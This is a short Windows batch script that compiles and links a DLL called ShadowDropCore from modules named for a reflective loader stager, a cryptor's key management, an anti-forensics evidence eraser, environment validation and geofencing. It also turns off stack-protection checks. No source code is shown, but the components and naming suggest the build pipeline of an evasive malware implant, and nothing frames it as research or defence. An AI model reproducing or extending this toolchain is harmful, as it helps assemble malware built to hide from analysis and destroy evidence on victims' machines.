@echo off
setlocal enabledelayedexpansion

set CFLAGS=/O2 /GL /GS- /Gy /MT /FAcs /EHsc /fp:fast /Qpar /arch:AVX2
set CFLAGS=!CFLAGS! /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_UNICODE" /D "UNICODE"
set LFLAGS=/LTCG /OPT:REF /OPT:ICF /DLL /RELEASE /NOLOGO

cl.exe !CFLAGS! /c Stager\ReflectiveLoader.cpp
cl.exe !CFLAGS! /c Cryptor\KeyManagement.cpp
cl.exe !CFLAGS! /c AntiForensics\EvidenceEraser.cpp
cl.exe !CFLAGS! /c OperationalSecurity\EnvValidator.cpp
cl.exe !CFLAGS! /c OperationalSecurity\GeoFence.cpp

:: link core DLL
link.exe !LFLAGS! /OUT:ShadowDropCore.dll ^
    ReflectiveLoader.obj ^
    KeyManagement.obj ^
    EvidenceEraser.obj ^
    EnvValidator.obj ^
    GeoFence.obj ^
    advapi32.lib ^
    ntdll.lib ^
    bcrypt.lib

del *.obj
